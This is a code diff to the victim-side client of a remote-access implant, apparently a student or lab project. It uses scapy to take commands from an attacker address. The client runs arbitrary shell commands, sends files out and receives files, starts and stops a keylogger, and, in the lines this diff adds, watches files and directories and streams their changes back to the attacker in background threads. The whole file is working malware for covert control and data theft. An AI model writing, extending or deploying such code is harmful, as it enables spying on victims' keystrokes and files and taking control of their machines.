@@ -1,20 +1,18 @@
-import argparse
 import signal
 import sys
-import time
+import subprocess
+import threading
 
 from pathlib import Path
 
 from scapy.all import *
 from scapy.layers.inet import UDP, IP, TCP
 
-from mods.protocol import send_data, receive_data, send_ack_packet
+from mods.protocol import send_data, receive_data, send_ack_packet, send_fin_packet
 from mods.knocking import wait_for_knock
 from mods.keylogger import start_keylogger, stop_keylogger
-from mods.monitoring import start_watching
-from mods.shared import ATTACKER_IP, VICTIM_IP
-
-SAVE_DIR = 'data_victim/'
+from mods.monitoring import watch_file, watch_directory
+from mods.shared import ATTACKER_IP, VICTIM_IP, Channel
 
 def run_shell_command(args) -> str:
     print(f'Running... {args}')
@@ -23,14 +21,25 @@ def run_shell_command(args) -> str:
         return res.stdout
     else:
         return res.stderr
-    
+
+def _send_watch(data: bytes):
+    send_data(data, src=VICTIM_IP, dst=ATTACKER_IP, channel=Channel.BACKGROUND, sleep=0)
+
+def _wait_for_stop() -> bool:
+    """Blocks until attacker sends 'ew' on the main channel. Returns True when stop received."""
+    while True:
+        signal_data = receive_data(from_ip=ATTACKER_IP, timeout=10)
+        if signal_data == b'ew':
+            return True
+
 def handle_command(cmd: str, args: list[str]) -> str:
     if cmd == 'sf':
         filename = args[0]
         send_ack_packet(src=VICTIM_IP, dst=ATTACKER_IP)
         file_bytes = receive_data(from_ip=ATTACKER_IP)
-        with open(f'data_victim/{filename}', 'wb') as f:
-            f.write(file_bytes)
+        save_path = Path(f'data/victim/{filename}')
+        save_path.parent.mkdir(parents=True, exist_ok=True)
+        save_path.write_bytes(file_bytes)
         return f'Downloaded file {filename}'
     elif cmd == 'dl':
         raw_path = args[0]
@@ -43,8 +52,8 @@ def handle_command(cmd: str, args: list[str]) -> str:
         return f'Sent file {filepath.name}'
     elif cmd == 'rn':
         result = run_shell_command(args)
-        send_ack_packet(ATTACKER_IP)
-        send_data(result.encode(), ATTACKER_IP)
+        send_ack_packet(src=VICTIM_IP, dst=ATTACKER_IP)
+        send_data(result.encode(), src=VICTIM_IP, dst=ATTACKER_IP)
         return f'Ran command {args}'
     elif cmd == 'k+':
         result = start_keylogger()
@@ -53,18 +62,36 @@ def handle_command(cmd: str, args: list[str]) -> str:
     elif cmd == 'k-':
         result = stop_keylogger()
         send_data(result.encode(), src=VICTIM_IP, dst=ATTACKER_IP)
-        return f'Keylogger stopped'
+        return 'Keylogger stopped'
     elif cmd == 'wf':
-        # TODO: Use watchdog to monitor this file and send results back to the attacker
-        return f'Watching file: {args[0]}'
+        if not args or not Path(args[0]).is_file():
+            send_fin_packet(src=VICTIM_IP, dst=ATTACKER_IP)
+            return 'Invalid file path'
+        send_ack_packet(src=VICTIM_IP, dst=ATTACKER_IP)
+        stop_event = threading.Event()
+        t = threading.Thread(target=watch_file, args=(args[0], _send_watch, stop_event), daemon=True)
+        t.start()
+        _wait_for_stop()
+        stop_event.set()
+        t.join(timeout=3)
+        return 'File watch ended'
     elif cmd == 'wd':
-        # TODO: Use watchdog to monitor this dir and send results back to the attacker
-        return f'Watching directory: {args[0]}'
+        if not args or not Path(args[0]).is_dir():
+            send_fin_packet(src=VICTIM_IP, dst=ATTACKER_IP)
+            return 'Invalid directory path'
+        send_ack_packet(src=VICTIM_IP, dst=ATTACKER_IP)
+        stop_event = threading.Event()
+        t = threading.Thread(target=watch_directory, args=(args[0], _send_watch, stop_event), daemon=True)
+        t.start()
+        _wait_for_stop()
+        stop_event.set()
+        t.join(timeout=3)
+        return 'Directory watch ended'
     elif cmd == 'dc':
         # TODO: Gracefully disconnect and end the session
         return 'Disconnected'
     elif cmd == 'un':
-        # TODO: Remove 
+        # TODO: Remove
         return 'Uninstalled'
     else:
         return 'Unrecognized command'
@@ -77,9 +104,6 @@ def main():
     signal.signal(signal.SIGINT, sigint_handler)
 
     print('hello from client')
-    # attacker_ip = wait_for_knock()
-    # print(f'knocking success from {attacker_ip}')
-    # send_ack_packet(attacker_ip)
 
     while True:
         command = receive_data(from_ip=ATTACKER_IP, timeout=360)
@@ -88,9 +112,7 @@ def main():
         parts = decoded.split(' ')
         res = handle_command(parts[0], parts[1:])
         print(res)
-    
-    # start_watching('test/')
 
- 
+
 if __name__ == "__main__":
     main()
